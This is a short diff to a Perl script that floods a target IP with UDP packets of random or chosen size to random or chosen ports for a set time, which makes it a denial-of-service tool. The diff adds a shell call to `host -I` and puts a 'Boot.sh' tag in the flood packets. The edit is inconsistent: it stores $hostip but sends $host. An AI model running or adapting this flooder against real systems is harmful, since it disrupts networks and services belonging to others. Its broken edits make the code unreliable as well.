@@ -7,6 +7,8 @@ if ($#ARGV != 3) {
   exit(1);
 }
  
+$hostip = `host -I`;
+
 my ($ip,$port,$size,$time) = @ARGV;
  
 my ($iaddr,$endtime,$psize,$pport);
@@ -26,5 +28,5 @@ for (;time() <= $endtime;) {
   $psize = $size ? $size : int(rand(1024-64)+64) ;
   $pport = $port ? $port : int(rand(65500))+1;
  
-  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
+  send(flood, pack("a$psize","Boot.sh - $host"), 0, pack_sockaddr_in($pport, $iaddr));}
   
